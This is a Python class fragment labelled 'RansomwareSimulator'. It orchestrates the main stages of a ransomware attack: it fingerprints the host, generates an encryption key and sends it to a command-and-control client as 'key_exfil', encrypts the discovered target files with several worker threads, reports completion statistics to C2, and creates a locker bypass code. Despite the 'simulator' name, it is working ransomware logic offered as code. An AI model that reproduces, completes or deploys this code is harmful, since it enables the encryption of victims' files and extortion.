class RansomwareSimulator:
    """Main simulator orchestrator."""
    
    def __init__(self):
        self.machine_id = self._generate_machine_id()
        self.crypto = CryptoEngine()
        self.file_manager = FileManager(CONFIG)
        self.c2 = C2Client(CONFIG, self.machine_id)
        self.stop_event = threading.Event()
        self.bypass_code = self._generate_bypass_code()
        
        logger.info(f"Simulator initialized | Machine ID: {self.machine_id}")
    
    def _generate_machine_id(self) -> str:
        """Generate unique machine identifier."""
        return hashlib.sha256(
            f"{socket.gethostname()}-{time.time()}-{random.random()}".encode()
        ).hexdigest()[:16]
    
    def _generate_bypass_code(self) -> str:
        """Generate locker bypass code."""
        return ''.join(random.choices(string.digits, k=CONFIG.locker_code_length))
    
    def _worker(self, file_queue: queue.Queue):
        """Worker thread for encryption."""
        while not self.stop_event.is_set():
            try:
                file_path = file_queue.get_nowait()
                op = self.file_manager.encrypt_file(file_path, self.crypto)
                
                with self.file_manager._lock:
                    self.file_manager.operations.append(op)
                
                file_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                logger.error(f"Worker error: {e}")
    
    def run_encryption(self):
        """Execute encryption phase."""
        logger.info("Starting encryption phase")
        
        # Generate and save key
        self.crypto.generate_key()
        self.crypto.save_key(CONFIG.key_file)
        
        # Report to C2
        self.c2.queue_message('key_exfil', {
            'key': base64.b64encode(self.crypto.key).decode(),
            'key_hash': self.crypto.get_key_hash()
        })
        
        # Discover files
        file_queue = self.file_manager.discover_files(CONFIG.target_dir)
        
        if file_queue.empty():
            logger.warning("No target files found")
            return
        
        # Start workers
        threads = []
        for i in range(CONFIG.thread_count):
            t = threading.Thread(
                target=self._worker,
                args=(file_queue,),
                name=f"Worker-{i}"
            )
            t.start()
            threads.append(t)
        
        # Wait for completion
        for t in threads:
            t.join()
        
        stats = self.file_manager.get_stats()
        logger.info(f"Encryption complete: {stats}")
        
        self.c2.queue_message('encryption_complete', stats)
    
